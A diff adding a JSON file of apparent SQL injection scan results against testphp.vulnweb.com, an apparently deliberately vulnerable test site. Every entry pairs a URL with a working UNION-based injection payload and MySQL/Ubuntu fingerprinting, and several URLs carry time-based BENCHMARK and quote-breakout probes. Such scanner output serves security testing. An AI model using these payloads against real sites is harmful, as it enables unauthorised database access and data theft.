@@ -1,1 +1,255 @@
-[]
+[
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%22..%2C%27.%29%29%29%2C",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%202--%20-",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%201--%20-",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%204--%20-",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%206--%20-",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%203--%20-",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27bJmeVo%3C%27%22%3EUdOhxD",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27pHbDuC%3C%27%22%3EyQLWoa",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27vlAIso%3C%27%22%3EYETIxV",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27qQrErS%3C%27%22%3EqhDCPc",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%2C%2C%2C%29%28%22%27%2C%29%28",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1.%29%27%28%28%28%22.%2C.",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1921",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20BENCHMARK%285000000%2CMD5%280x41764c4a%29%29%23",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20BENCHMARK%285000000%2CMD5%280x474d6678%29%29",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48675a4b%29%29--%20wgZo",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20BENCHMARK%285000000%2CMD5%280x66726450%29%29--%20WqjC",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=3299",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=8732",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/AJAX/infoartist.php?id=9023",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6822 UNION ALL SELECT 3392,CONCAT(0x71626b7871,0x526657696d694758487048474967627172766a6153666c5078424d43414441776576776364436941,0x716b787a71),3392-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6811 UNION ALL SELECT NULL,CONCAT(0x7162786271,0x4e4a634e68434972645263575766794749625a766764766377466c717576564e52664b5258666f51,0x716b717671),NULL-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    },
+    {
+        "url": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=1",
+        "vulnerabilities": [
+            {
+                "payload": "id=-6984 UNION ALL SELECT CONCAT(0x71627a6b71,0x42496d4c4e54764a63786c426b67446b514d4764536f4c59534c4b795147536d5557716e77454e77,0x717a707171),NULL,NULL,NULL,NULL-- -",
+                "server_os": "Linux Ubuntu",
+                "dbms": "MySQL",
+                "dbms_version": "8.0.0"
+            }
+        ]
+    }
+]
